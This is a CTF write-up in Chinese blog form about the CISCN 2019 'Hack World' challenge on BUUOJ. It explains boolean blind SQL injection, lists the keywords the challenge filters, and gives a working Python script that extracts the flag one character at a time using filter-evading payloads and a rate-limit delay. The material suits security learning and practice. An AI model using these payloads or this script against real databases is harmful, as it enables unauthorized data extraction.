---
title: buuoj刷题记录3
date: 2019-12-27 12:42:41
tags:
 - ciscn
 - web
 - ctf
 - buuctf
categories: 
 - 刷题记录
---

## [CISCN2019 华北赛区 Day2 Web1]Hack World

### 0x00 基础

SQL盲注，使用`if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）`函数一个一个的猜字符，过滤绕过，空格可以使用`+、\t、/**/、()`绕过。
```
if(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值
ascii(char)
substr（str,pos,len)
```
<!--more-->

### 0x01 分析

题目提示

```
flag{} 里为 uuid
```

访问页面

![](/pic/3.jpg)



使用burp suite进行sql fuzz测试，以下字符被过滤

|       %20        | 482  | SQL Injection Checked |
| :--------------: | ---- | --------------------- |
|       AND        | 482  | SQL Injection Checked |
|      DELETE      | 482  | SQL Injection Checked |
|     END-EXEC     | 482  | SQL Injection Checked |
|      GROUP       | 482  | SQL Injection Checked |
|      INSERT      | 482  | SQL Injection Checked |
|       INTO       | 482  | SQL Injection Checked |
|      LIMIT       | 482  | SQL Injection Checked |
|        OR        | 482  | SQL Injection Checked |
|      UNION       | 482  | SQL Injection Checked |
|      UPDATE      | 482  | SQL Injection Checked |
|        +         | 482  | SQL Injection Checked |
|        /         | 482  | SQL Injection Checked |
|        -         | 482  | SQL Injection Checked |
|        *         | 482  | SQL Injection Checked |
|        `         | 482  | SQL Injection Checked |
|        "         | 482  | SQL Injection Checked |
|       \|\|       | 482  | SQL Injection Checked |
|        &&        | 482  | SQL Injection Checked |
|       %23        | 482  | SQL Injection Checked |
|;|482|SQL Injection Checked |
`if,substr,ascii,<,>,=,(),/t`都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用`/t、( )代替`

### 0x02 开始操作

```python
# -*- coding: utf-8 -*-
# @Time    : 12/27/2019 6:11 PM
import requests
import time

url = "http://97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn/index.php"
result = ''

for x in range(1, 43):
    high = 126
    low = 45
    mid = (low + high) // 2


    while high - low > 1:
        payload = "if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)" % (x, mid)
        data = {
            "id": payload
        }
        time.sleep(0.3)
        res = requests.post(url, data = data)
        if 'Hello' in res.text:
            low = mid
        else:
            high = mid
        mid = (low + high) // 2

    if high - low == 1:
        payload = "if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)" % (x, high)
        data = {
            "id": payload
        }
        response = requests.post(url, data=data)
        if 'Hello' in response.text:
            result += chr(int(mid+1))
        else :
            result += chr(int(mid))
    else :
        result += chr(int(mid))
    print(result)
```

```bash
f
fl
fla
flag
flag{
flag{a
flag{a2
flag{a22
flag{a22c
flag{a22cf
flag{a22cf6
flag{a22cf69
flag{a22cf690
flag{a22cf690-
flag{a22cf690-3
flag{a22cf690-34
flag{a22cf690-342
flag{a22cf690-342a
flag{a22cf690-342a-
flag{a22cf690-342a-4
flag{a22cf690-342a-4b
flag{a22cf690-342a-4bf
flag{a22cf690-342a-4bf4
flag{a22cf690-342a-4bf4-
flag{a22cf690-342a-4bf4-8
flag{a22cf690-342a-4bf4-88
flag{a22cf690-342a-4bf4-885
flag{a22cf690-342a-4bf4-885b
flag{a22cf690-342a-4bf4-885b-
flag{a22cf690-342a-4bf4-885b-d
flag{a22cf690-342a-4bf4-885b-df
flag{a22cf690-342a-4bf4-885b-df3
flag{a22cf690-342a-4bf4-885b-df33
flag{a22cf690-342a-4bf4-885b-df332
flag{a22cf690-342a-4bf4-885b-df332d
flag{a22cf690-342a-4bf4-885b-df332d4
flag{a22cf690-342a-4bf4-885b-df332d44
flag{a22cf690-342a-4bf4-885b-df332d446
flag{a22cf690-342a-4bf4-885b-df332d4469
flag{a22cf690-342a-4bf4-885b-df332d44698
flag{a22cf690-342a-4bf4-885b-df332d44698d
flag{a22cf690-342a-4bf4-885b-df332d44698d}
```

因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。



